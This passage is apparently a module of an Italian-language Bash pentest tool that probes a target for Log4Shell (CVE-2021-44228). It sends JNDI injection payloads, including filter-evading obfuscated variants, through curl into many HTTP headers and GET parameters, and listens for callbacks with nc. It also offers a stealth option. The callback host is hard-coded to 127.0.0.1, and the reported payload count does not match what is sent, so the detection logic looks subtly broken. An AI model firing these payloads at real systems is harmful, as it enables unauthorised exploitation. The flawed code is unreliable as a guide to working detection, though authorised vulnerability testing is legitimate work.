    echo "  per rilevare callback DNS/LDAP."
    echo ""
    echo "Opzioni:"
    echo "  --port PORT      Porta HTTP target (default: 80)"
    echo "  --scheme SCHEME  http|https (default: http)"
    echo "  --lport PORT     Porta listener locale (default: 1389)"
    echo "  --output DIR"
    echo "  --dry-run"
}

cmd_log4shell() {
    local target="" port=80 scheme="http" lport=1389
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --port)    _req_arg "$1" "${2:-}"; port="$2";        shift 2 ;;
            --scheme)  _req_arg "$1" "${2:-}"; scheme="$2";      shift 2 ;;
            --lport)   _req_arg "$1" "${2:-}"; lport="$2";       shift 2 ;;
            --output)  _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
            --dry-run) DRY_RUN=1;              shift ;;
            --stealth) STEALTH=1;              shift ;;
            --help|-h) usage_log4shell; exit 0 ;;
            -*)        err "Opzione sconosciuta: $1"; usage_log4shell; exit 1 ;;
            *)         target="$1"; shift ;;
        esac
    done
    [[ -z "$target" ]] && { err "TARGET mancante"; usage_log4shell; exit 1; }
    validate_target "$target"
    check_root
    setup_outdir "$target" "log4shell"
    log "Target: ${scheme}://${target}:${port} | Output: $OUTDIR"

    local base_url="${scheme}://${target}:${port}"
    local insecure=""; [[ "$scheme" == "https" ]] && insecure="-k"

    # Payload JNDI in varianti obfuscate
    local -a _payloads=(
        "\${jndi:ldap://127.0.0.1:${lport}/a}"
        "\${jndi:ldap://127.0.0.1:${lport}/exa}"
        "\${jndi:rmi://127.0.0.1:${lport}/a}"
        "\${jndi:dns://127.0.0.1:${lport}/a}"
        "\${\${lower:j}ndi:\${lower:l}dap://127.0.0.1:${lport}/a}"
        "\${\${::-j}\${::-n}\${::-d}\${::-i}:ldap://127.0.0.1:${lport}/a}"
        "\${\${upper:j}ndi:\${upper:l}dap://127.0.0.1:${lport}/a}"
        "\${\${env:NaN:-j}ndi:\${env:NaN:-l}dap://127.0.0.1:${lport}/a}"
    )

    section "Log4Shell — Avvio listener locale :$lport"
    local _cb_file="$OUTDIR/callback.txt"
    local _listener_pid=""
    if [[ $DRY_RUN -eq 0 ]]; then
        rm -f "$_cb_file"
        nc -l -p "$lport" > "$_cb_file" 2>/dev/null &
        _listener_pid=$!
        log "Listener LDAP/TCP su :$lport (PID $_listener_pid)"
    else
        echo -e "${CYAN}[DRY-RUN]${NC} nc -l -p $lport (listener callback)"
    fi

    section "Log4Shell — Injection header HTTP"
    local -a _headers=("User-Agent" "X-Forwarded-For" "X-Api-Version" "Referer" "X-Client-IP"
                       "Authorization" "Accept-Language" "X-Originating-IP" "CF-Connecting-IP"
                       "X-Real-IP" "Forwarded")
    local _found_cb=0
    if [[ $DRY_RUN -eq 0 ]]; then
        for _payload in "${_payloads[@]:0:3}"; do
            for _hdr in "${_headers[@]}"; do
                curl -s $insecure --max-time 5 \
                    -H "${_hdr}: ${_payload}" \
                    "${base_url}/" > /dev/null 2>&1 || true
            done
            # Parametri GET comuni
            for _param in "q" "search" "user" "id" "name" "value" "input" "data" "cmd"; do
                curl -s $insecure --max-time 5 \
                    "${base_url}/?${_param}=${_payload}" > /dev/null 2>&1 || true
            done
        done
        echo "Payload inviati: ${#_payloads[@]} varianti x ${#_headers[@]} headers" \
            >> "$OUTDIR/log4shell_probe.txt"
        # Attendi callback (max 5s)
        sleep 5
        if [[ -s "$_cb_file" ]]; then
            found CRITICAL "Log4Shell CVE-2021-44228 — CALLBACK RICEVUTO su :$lport!"
            cp "$_cb_file" "$OUTDIR/callback_data.txt"
            _found_cb=1
        else
            log "Nessun callback ricevuto — target probabilmente non vulnerabile o payload filtrato"
        fi
        # Cleanup listener
        [[ -n "$_listener_pid" ]] && kill "$_listener_pid" 2>/dev/null || true
    else
        echo -e "${CYAN}[DRY-RUN]${NC} Log4Shell probe: ${#_payloads[@]} payload x ${#_headers[@]} headers + GET params"
    fi

    # Controlla anche se il payload appare non filtrato nel response (reflected)
    section "Log4Shell — Reflected detection"
    if [[ $DRY_RUN -eq 0 && $_found_cb -eq 0 ]]; then
        local _probe="\${jndi:ldap://log4shell-probe/test}"
        local _resp
        _resp=$(curl -s $insecure --max-time 8 \
            -H "User-Agent: ${_probe}" \
            "${base_url}/" 2>/dev/null | head -50 || true)
        echo "$_resp" > "$OUTDIR/reflected_probe.txt"
        if echo "$_resp" | grep -qi "jndi\|log4j\|ldap://"; then
            found HIGH "Log4Shell — payload riflesso nella risposta (possibile vulnerabilità)"
        fi
    fi

    ok "Log4Shell audit completato → $OUTDIR"
}

